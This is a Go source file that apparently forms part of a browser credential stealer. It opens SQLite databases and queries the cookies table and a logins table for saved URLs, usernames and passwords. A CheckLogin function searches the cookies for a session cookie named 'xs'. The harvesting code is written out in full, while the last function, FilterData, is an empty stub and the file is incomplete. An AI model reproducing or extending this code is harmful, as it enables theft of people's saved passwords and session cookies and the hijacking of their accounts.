package pkg

import (
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"strings"
)

const (
	CookiesSQL = "SELECT * FROM cookies"
	Passwords  = "SELECT action_url, username_value, password_value from logins"
)

func ConnectSQLite(path string) (*sql.DB, error) {
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return nil, err
	}
	return db, nil
}

func QueryData(db *sql.DB, querySQL string) ([]map[string]interface{}, error) {
	rows, err := db.Query(querySQL)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	result := []map[string]interface{}{}
	columns, _ := rows.Columns()
	for rows.Next() {
		values := make([]interface{}, len(columns))
		valuePtrs := make([]interface{}, len(columns))
		for i := range values {
			valuePtrs[i] = &values[i]
		}
		err := rows.Scan(valuePtrs...)
		if err != nil {
			return nil, err
		}
		entry := make(map[string]interface{})
		for i, col := range columns {
			val := values[i]
			if b, ok := val.([]byte); ok {
				entry[col] = string(b)
			} else {
				entry[col] = val
			}
		}
		result = append(result, entry)
	}
	if err = rows.Err(); err != nil {
		return nil, err
	}

	return result, nil
}

func CheckLogin(cookie []map[string]interface{}) interface{} {
	for _, row := range cookie {
		value, ok := row["host_key"].(string)
		if !ok {
			continue
		}
		if row["name"] == "xs" && strings.Contains(value, "fff") {
			return row

		}
	}
	return nil
}

func FilterData(cookie []map[string]interface{}, conditions []string) []map[string]interface{} {

}
